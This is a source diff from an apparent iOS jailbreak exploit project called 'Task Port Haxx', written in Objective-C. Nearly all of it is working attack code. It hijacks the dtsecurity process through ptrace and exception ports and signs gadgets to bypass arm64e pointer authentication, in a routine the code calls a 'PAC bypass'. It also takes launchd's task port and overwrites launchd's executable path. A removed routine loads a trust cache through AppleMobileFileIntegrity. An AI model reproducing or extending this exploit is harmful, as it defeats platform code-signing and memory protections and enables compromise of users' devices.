@@ -14,6 +14,26 @@
 #import "ViewController.h"
 #import "Header.h"
 
+struct dyld_all_image_infos *_alt_dyld_get_all_image_infos(void) {
+    static struct dyld_all_image_infos *result;
+    if (result) {
+        return result;
+    }
+    struct task_dyld_info dyld_info;
+    mach_vm_address_t image_infos;
+    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
+    kern_return_t ret;
+    ret = task_info(mach_task_self_,
+                    TASK_DYLD_INFO,
+                    (task_info_t)&dyld_info,
+                    &count);
+    if (ret != KERN_SUCCESS) {
+        return NULL;
+    }
+    image_infos = dyld_info.all_image_info_addr;
+    result = (struct dyld_all_image_infos *)image_infos;
+    return result;
+}
 NSDictionary *getLaunchdStringOffsets(void) {
     NSMutableDictionary *dict = [NSMutableDictionary dictionary];
     
@@ -74,30 +94,6 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
 
 @implementation ViewController
 
-- (void)loadTrustCacheTapped {
-    // Download arm64 XPC service from Apple which we will use to initiate PAC bypass
-    char *path = "/var/mobile/.TrustCache";
-    int fd = open(path, O_RDONLY);
-    struct stat s;
-    fstat(fd, &s);
-    void *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
-    assert(map != MAP_FAILED);
-    CFDictionaryRef match = IOServiceMatching("AppleMobileFileIntegrity");
-    io_service_t svc = IOServiceGetMatchingService(0, match);
-    io_connect_t conn;
-    IOServiceOpen(svc, mach_task_self_, 0, &conn);
-    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, map, s.st_size, NULL, NULL, NULL, NULL);
-    if (kr != KERN_SUCCESS) {
-        printf("IOConnectCallMethod failed: %s\n", mach_error_string(kr));
-    } else {
-        printf("Successfully loaded trust cache from %s\n", path);
-    }
-    IOServiceClose(conn);
-    IOObjectRelease(svc);
-    munmap((void *)map, s.st_size);
-    close(fd);
-}
-
 - (void)viewDidLoad {
     [super viewDidLoad];
     self.navigationItem.title = @"Task Port Haxx";
@@ -156,7 +152,7 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
     }
     
     self.fakeBootstrapPort = setup_fake_bootstrap_server();
-    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_donor_exception_server"];
+    self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
     self.ubProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.updatebrain_exception_server"];
     
     // TODO: save offsets
@@ -261,9 +257,6 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
     kern_return_t kr;
     vm_size_t page_size = getpagesize();
     
-    [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
-    printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
-    
     // attach to dtsecurity
     kr = (int)RemoteArbCall(self.ubProc, ptrace, PT_ATTACHEXC, self.dtProc.pid, 0, 0);
     printf("ptrace(PT_ATTACHEXC) returned %d\n", kr);
@@ -329,12 +322,14 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
         return;
     }
     
-    // Set hardware breakpoint 1 to pacia instruction
+    // Find pacia instruction in dyld`start
     uint64_t _dyld_start = self.dtProc.newState->__pc;
     xpaci(_dyld_start);
     uint64_t pacia_inst = getDyldPACIAOffset(_dyld_start);
     printf("_dyld_start: 0x%llx\n", _dyld_start);
     printf("pacia: 0x%llx\n", pacia_inst);
+    
+    // Set hardware breakpoint 1 to pacia instruction
     [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst];
     [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0x1e5];
     kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
@@ -350,14 +345,12 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
     RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGCONT);
     self.dtProc.expectedLR = 0;
     [self.dtProc resume];
-    printf("Resume1:\n");
-    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
+    printf("Resume1: PC: 0x%llx\n", self.dtProc.newState->__pc);
     
     // This shall step to pacia instruction
     self.dtProc.expectedLR = (uint64_t)-1;
     [self.dtProc resume];
-    printf("Resume2:\n");
-    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
+    printf("Resume2: PC: 0x%llx\n", self.dtProc.newState->__pc);
     
     uint64_t currPC = self.dtProc.newState->__pc;
     xpaci(currPC);
@@ -365,11 +358,8 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
         printf("Did not hit pacia breakpoint?\n");
         return;
     }
-    
+    self.dtProc.expectedLR = (uint64_t)self.dtProc.newState->__lr;
     printf("We hit PACIA breakpoint!\n");
-    self.dtProc.newState->__x[16] = brX8Address;
-    self.dtProc.newState->__x[8] = 0x74810000AA000000; // 'pc' discriminator, 0xAA diversifier
-    
     // Move our hardware breakpoint to the next instruction after pacia
     // TODO: maybe single step instead?
     [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:pacia_inst+4];
@@ -379,23 +369,45 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
         printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
         return;
     }
+    // Save x16 and x8 for later restore
+    uint64_t origX16 = self.dtProc.newState->__x[16];
+    uint64_t origX8 = self.dtProc.newState->__x[8];
+    self.dtProc.newState->__x[8] = 0x74810000AA000000; // 'pc' discriminator, 0xAA diversifier
     
+    // MARK: Sign pacia pointer
+    self.dtProc.newState->__x[16] = xpaci(self.dtProc.newState->__pc);
     [self.dtProc resume];
-    printf("Resume3:\n");
-    printf("PC: 0x%llx\n", self.dtProc.newState->__pc);
+    printf("Resume3: PC: 0x%llx\n", self.dtProc.newState->__pc);
+    uint64_t signedPaciaPtr = self.dtProc.newState->__x[16];
+    printf("Signed pacia gadget: 0x%llx\n", signedPaciaPtr);
     
+    // MARK: Sign br x8 pointer
+    // Step back to pacia instruction to sign br x8
+    self.dtProc.newState->__x[16] = brX8Address;
+    self.dtProc.newState->__pc = signedPaciaPtr;
+    self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
+    [self.dtProc resume];
+    printf("Resume4: PC: 0x%llx\n", self.dtProc.newState->__pc);
     brX8Address = self.dtProc.newState->__x[16];
-    printf("Signed Pointer: 0x%lx\n", brX8Address);
+    printf("Signed brX8Address: 0x%lx\n", brX8Address);
     
-    // At this point we have corrupted x16 and x8 to sign br x8 gadget, it's quite complicated
-    // to continue from here as we need to have a signed pacia beforehand, then sign br x8 and
-    // set registers back to repair. Instead we will kill and replace dtsecurity.
-    printf("Cleaning up after PAC bypass\n");
-    RemoteArbCall(self.ubProc, ptrace, PT_KILL, self.dtProc.pid);
-    RemoteArbCall(self.ubProc, kill, self.dtProc.pid, SIGKILL);
-    [self.dtProc terminate];
-    [self.ubProc terminate];
-    self.ubProc = nil;
+    // Clear hardware breakpoint
+    [self.ubProc write64:(uint64_t)&debug_state->__bvr[0] value:0];
+    [self.ubProc write64:(uint64_t)&debug_state->__bcr[0] value:0];
+    kr = (kern_return_t)RemoteArbCall(self.ubProc, thread_set_state, dtsecurity_thread, ARM_DEBUG_STATE64, (uint64_t)debug_state, ARM_DEBUG_STATE64_COUNT);
+    if (kr != KERN_SUCCESS) {
+        printf("thread_set_state(ARM_DEBUG_STATE64) failed: %s\n", mach_error_string(kr));
+        return;
+    }
+    
+    // Restore original values
+    self.dtProc.newState->__x[16] = origX16;
+    self.dtProc.newState->__x[8] = origX8;
+    self.dtProc.newState->__pc = signedPaciaPtr;
+    self.dtProc.newState->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
+    self.dtProc.expectedLR = (uint64_t)-1;
+    [self.dtProc resume];
+    printf("Resume5: PC: 0x%llx\n", self.dtProc.newState->__pc);
 }
 
 #define RemoteRead32(addr) [self.dtProc read32:addr]
@@ -404,27 +416,25 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
 #define RemoteWrite64(addr, value_) [self.dtProc write64:addr value:value_]
 - (void)arbCallButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        [self.dtProc spawnProcess:@"dtsecurity" suspended:YES];
+        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
+        
         if (*(uint32_t *)getpagesize == 0xd503237f) {
             // we know this is arm64e hardware if some function starts with pacibsp
             [self performBypassPAC];
+        } else {
+            while (!self.dtProc.newState) {
+#warning TODO: maybe another semaphore
+                usleep(200000);
+            }
         }
         
         kern_return_t kr;
         vm_size_t page_size = getpagesize();
         
-        self.dtProc = [[ProcessContext alloc] initWithExceptionPortName:@"com.kdt.taskporthaxx.dtsecurity_exception_server"];
-        [self.dtProc spawnProcess:@"dtsecurity" suspended:NO];
-        printf("Spawned dtsecurity with PID %d\n", self.dtProc.pid);
-        
         // Change LR
-        while (!self.dtProc.newState) {
-#warning TODO: maybe another semaphore
-            usleep(200000);
-        }
-        self.dtProc.newState->__lr = 0xFFFFFF00;
-        self.dtProc.newState->__flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
-                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR |
-                                           __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
+        self.dtProc.lr = 0xFFFFFF00;
+        self.dtProc.expectedLR = 0xFFFFFF00;
         
         // Create a region which holds temp data (should we use stack instead?)
         vm_address_t map = RemoteArbCall(self.dtProc, mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
@@ -446,7 +456,7 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
 //            return;
 //        }
 //        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
-        // Map the page we allocated in dtsecurity to this process
+//        // Map the page we allocated in dtsecurity to this process
 //        kr = (kern_return_t)RemoteArbCall(self.dtProc, vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
 //        if (kr != KERN_SUCCESS) {
 //            printf("Failed to create dtsecurity<->haxx shared mapping\n");
@@ -455,22 +465,6 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
 //        vm_address_t local_map = RemoteRead64(map);
 //        printf("Created shared mapping: 0x%lx\n", local_map);
 //        printf("read: 0x%llx\n", *(uint64_t *)local_map);
-        
-        // Get dtsecurity dyld base for blr x19
-        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
-         kr = (kern_return_t)RemoteArbCall(self.dtProc, task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
-        if (kr != KERN_SUCCESS) {
-            printf("task_info failed\n");
-            return;
-        }
-        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
-        vm_address_t remote_dyld_base;
-        do {
-            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
-            // FIXME: why do I have to sleep a bit for dyld base to be available?
-            usleep(100000);
-        } while (remote_dyld_base == 0);
-        printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
         
         // Get launchd task port
         kr = (kern_return_t)RemoteArbCall(self.dtProc, task_for_pid, dtsecurity_task, 1, map);
@@ -489,7 +483,7 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
             printf("task_info failed\n");
             return;
         }
-        remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
+        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
         printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
         
         // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
@@ -578,7 +572,7 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
         printf("Successfully overwrote launchd executable path string to %s\n", newPath);
 
         //RemoteArbCall(self.dtProc, exit, 0);
-
+        
         // stuff
 //        uint64_t remote_list = map + sizeof(uint64_t);
 //        RemoteArbCall(self.dtProc, task_threads, launchd_task, remote_list, map);
@@ -656,7 +650,7 @@ uint64_t getDyldPACIAOffset(uint64_t _dyld_start) {
 
 - (void)detachButtonTapped {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        printf("Currently do nothing\n");
+        RemoteArbCall(self.dtProc, sleep, 1);
     });
 }
 
